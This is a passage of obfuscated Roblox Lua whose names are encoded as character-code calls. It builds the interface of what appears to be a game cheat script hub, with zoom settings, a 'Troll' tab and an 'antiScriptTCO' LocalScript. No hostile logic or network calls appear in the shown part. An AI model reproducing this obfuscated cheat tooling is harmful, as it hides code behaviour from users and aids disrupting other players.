_llza[_sc(50,57,53)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,57,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,57,53)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(50,57,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(50,57,54)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,57,53)]);
_llza[_sc(50,57,54)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(50,57,54)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(50,57,55)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(50,57,53)]);
_llza[_sc(50,57,55)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,57,55)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,57,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,57,55)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(50,57,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,57,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,57,56)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(50,57,55)]);
_llza[_sc(50,57,56)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(50,57,56)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(50,57,57)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(50,57,50)]);
_llza[_sc(50,57,57)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(50,57,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,57,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,57,57)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,57,57)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(50,57,57)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,57,57)][_sc(83,105,122,101)]=UDim2.new(0, 156, 0, 20);
_llza[_sc(50,57,57)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,57,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,57,57)][_sc(84,101,120,116)]=[[Max Zoom]];
_llza[_sc(50,57,57)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,57,57)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(50,57,57)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,57,57)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(50,57,97)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,57,57)]);
_llza[_sc(50,57,97)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(50,57,98)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,57,57)]);
_llza[_sc(50,57,98)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,57,99)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,57,50)]);
_llza[_sc(50,57,99)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(50,57,100)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,57,50)]);
_llza[_sc(50,57,100)][_sc(90,73,110,100,101,120)]=55;
_llza[_sc(50,57,100)][_sc(83,105,122,101)]=UDim2.new(0, 79, 0, 20);
_llza[_sc(50,57,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,57,100)][_sc(78,97,109,101)]=[[MaxZoom]];
_llza[_sc(50,57,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,57,100)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,57,100)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.54598, 0, 0, 0);
_llza[_sc(50,57,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,57,101)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,57,100)]);
_llza[_sc(50,57,101)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(50,57,101)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(50,57,101)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(50,57,101)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(50,57,102)]=Instance.new(_sc(84,101,120,116,66,111,120),_llza[_sc(50,57,100)]);
_llza[_sc(50,57,102)][_sc(80,108,97,99,101,104,111,108,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(50,57,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(50,57,102)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,57,102)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(50,57,102)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,57,102)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(50,57,102)][_sc(80,108,97,99,101,104,111,108,100,101,114,84,101,120,116)]=[[(400)]];
_llza[_sc(50,57,102)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,57,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,57,102)][_sc(84,101,120,116)]=[[]];
_llza[_sc(50,57,102)][_sc(78,97,109,101)]=[[textbox]];
_llza[_sc(50,97,48)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,57,102)]);
_llza[_sc(50,97,48)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(50,97,48)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(50,97,48)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(50,97,49)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(50,57,102)]);
_llza[_sc(50,97,49)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,97,49)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,97,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,97,49)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(50,97,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,97,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,97,50)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(50,97,49)]);
_llza[_sc(50,97,50)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(50,97,50)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(50,97,51)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,57,102)]);
_llza[_sc(50,97,51)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,97,52)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,55,99)]);
_llza[_sc(50,97,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(50,97,52)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(50,97,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,97,52)][_sc(78,97,109,101)]=[[MinZoom]];
_llza[_sc(50,97,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,97,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,97,52)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(50,97,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,97,53)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(50,97,52)]);
_llza[_sc(50,97,53)][_sc(90,73,110,100,101,120)]=50;
_llza[_sc(50,97,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,97,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,97,53)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,97,53)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,97,53)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,97,53)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,97,53)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(50,97,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,97,53)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,97,53)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(50,97,54)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,97,53)]);
_llza[_sc(50,97,54)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(50,97,54)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(50,97,54)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(50,97,54)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(50,97,55)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,97,53)]);
_llza[_sc(50,97,55)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(50,97,55)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,97,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,97,55)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(50,97,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(50,97,56)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,97,55)]);
_llza[_sc(50,97,56)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(50,97,56)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(50,97,57)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(50,97,55)]);
_llza[_sc(50,97,57)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,97,57)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,97,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,97,57)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(50,97,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,97,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,97,97)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(50,97,57)]);
_llza[_sc(50,97,97)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(50,97,97)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(50,97,98)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(50,97,52)]);
_llza[_sc(50,97,98)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(50,97,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,97,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,97,98)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,97,98)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(50,97,98)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,97,98)][_sc(83,105,122,101)]=UDim2.new(0, 156, 0, 20);
_llza[_sc(50,97,98)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,97,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,97,98)][_sc(84,101,120,116)]=[[Min Zoom]];
_llza[_sc(50,97,98)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,97,98)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(50,97,98)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,97,98)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(50,97,99)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,97,98)]);
_llza[_sc(50,97,99)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(50,97,100)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,97,98)]);
_llza[_sc(50,97,100)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,97,101)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,97,52)]);
_llza[_sc(50,97,101)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(50,97,102)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,97,52)]);
_llza[_sc(50,97,102)][_sc(90,73,110,100,101,120)]=55;
_llza[_sc(50,97,102)][_sc(83,105,122,101)]=UDim2.new(0, 79, 0, 20);
_llza[_sc(50,97,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,97,102)][_sc(78,97,109,101)]=[[MinZoom]];
_llza[_sc(50,97,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,97,102)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,97,102)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.54598, 0, 0, 0);
_llza[_sc(50,97,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,98,48)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,97,102)]);
_llza[_sc(50,98,48)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(50,98,48)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(50,98,48)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(50,98,48)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(50,98,49)]=Instance.new(_sc(84,101,120,116,66,111,120),_llza[_sc(50,97,102)]);
_llza[_sc(50,98,49)][_sc(80,108,97,99,101,104,111,108,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(50,98,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(50,98,49)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,98,49)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(50,98,49)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,98,49)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(50,98,49)][_sc(80,108,97,99,101,104,111,108,100,101,114,84,101,120,116)]=[[(0.5)]];
_llza[_sc(50,98,49)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,98,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,98,49)][_sc(84,101,120,116)]=[[]];
_llza[_sc(50,98,49)][_sc(78,97,109,101)]=[[textbox]];
_llza[_sc(50,98,50)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,98,49)]);
_llza[_sc(50,98,50)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(50,98,50)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(50,98,50)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(50,98,51)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(50,98,49)]);
_llza[_sc(50,98,51)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,98,51)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,98,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,98,51)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(50,98,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,98,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,98,52)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(50,98,51)]);
_llza[_sc(50,98,52)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(50,98,52)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(50,98,53)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,98,49)]);
_llza[_sc(50,98,53)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,98,54)]=Instance.new(_sc(83,99,114,111,108,108,105,110,103,70,114,97,109,101),_llza[_sc(52,55)]);
_llza[_sc(50,98,54)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,98,54)][_sc(67,97,110,118,97,115,83,105,122,101)]=UDim2.new(0, 0, 1.5, 0);
_llza[_sc(50,98,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,98,54)][_sc(78,97,109,101)]=[[Troll]];
_llza[_sc(50,98,54)][_sc(83,105,122,101)]=UDim2.new(0, 360, 0, 255);
_llza[_sc(50,98,54)][_sc(83,99,114,111,108,108,66,97,114,73,109,97,103,101,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,98,54)][_sc(86,105,115,105,98,108,101)]=false;
_llza[_sc(50,98,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,98,54)][_sc(83,99,114,111,108,108,66,97,114,84,104,105,99,107,110,101,115,115)]=0;
_llza[_sc(50,98,54)][_sc(65,99,116,105,118,101)]=true;
_llza[_sc(50,98,54)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,98,54)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.01351, 0, 0.01887, 0);
_llza[_sc(50,98,55)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,98,54)]);
_llza[_sc(50,98,55)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 255);
_llza[_sc(50,98,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,98,55)][_sc(78,97,109,101)]=[[rightside]];
_llza[_sc(50,98,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,98,55)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,98,55)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.51081, 0, 0, 0);
_llza[_sc(50,98,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,98,56)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(50,98,55)]);
_llza[_sc(50,98,56)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(50,98,56)][_sc(80,97,100,100,105,110,103)]=UDim.new(0, 5);
_llza[_sc(50,98,57)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,98,54)]);
_llza[_sc(50,98,57)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 255);
_llza[_sc(50,98,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,98,57)][_sc(78,97,109,101)]=[[leftside]];
_llza[_sc(50,98,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,98,57)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,98,57)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(-0.00038, 0, 0, 0);
_llza[_sc(50,98,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,98,97)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(50,98,57)]);
_llza[_sc(50,98,97)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(50,98,97)][_sc(80,97,100,100,105,110,103)]=UDim.new(0, 5);
_llza[_sc(50,98,98)]=Instance.new(_sc(83,99,114,111,108,108,105,110,103,70,114,97,109,101),_llza[_sc(52,55)]);
_llza[_sc(50,98,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,98,98)][_sc(67,97,110,118,97,115,83,105,122,101)]=UDim2.new(0, 0, 1.5, 0);
_llza[_sc(50,98,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,98,98)][_sc(78,97,109,101)]=[[TCOMain]];
_llza[_sc(50,98,98)][_sc(83,105,122,101)]=UDim2.new(0, 360, 0, 255);
_llza[_sc(50,98,98)][_sc(83,99,114,111,108,108,66,97,114,73,109,97,103,101,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,98,98)][_sc(86,105,115,105,98,108,101)]=false;
_llza[_sc(50,98,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,98,98)][_sc(83,99,114,111,108,108,66,97,114,84,104,105,99,107,110,101,115,115)]=0;
_llza[_sc(50,98,98)][_sc(65,99,116,105,118,101)]=true;
_llza[_sc(50,98,98)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,98,98)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.01351, 0, 0.01887, 0);
_llza[_sc(50,98,99)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,98,98)]);
_llza[_sc(50,98,99)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 255);
_llza[_sc(50,98,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,98,99)][_sc(78,97,109,101)]=[[rightside]];
_llza[_sc(50,98,99)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,98,99)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,98,99)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.51081, 0, 0, 0);
_llza[_sc(50,98,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,98,100)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(50,98,99)]);
_llza[_sc(50,98,100)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(50,98,100)][_sc(80,97,100,100,105,110,103)]=UDim.new(0, 5);
_llza[_sc(50,98,101)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,98,99)]);
_llza[_sc(50,98,101)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 160);
_llza[_sc(50,98,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,98,101)][_sc(78,97,109,101)]=[[antiTab]];
_llza[_sc(50,98,101)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,98,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(11, 11, 11);
_llza[_sc(50,98,102)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(50,98,101)]);
_llza[_sc(50,98,102)][_sc(78,97,109,101)]=_sc(97,110,116,105,83,99,114,105,112,116,84,67,79);
_llza[_sc(50,99,48)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,98,101)]);
_llza[_sc(50,99,48)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 4);
_llza[_sc(50,99,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,99,48)][_sc(78,97,109,101)]=[[======ACCENT======]];
_llza[_sc(50,99,48)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,99,48)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,99,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,99,49)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,99,48)]);
_llza[_sc(50,99,49)][_sc(83,105,122,101)]=UDim2.new(1, -2, 0, 2);
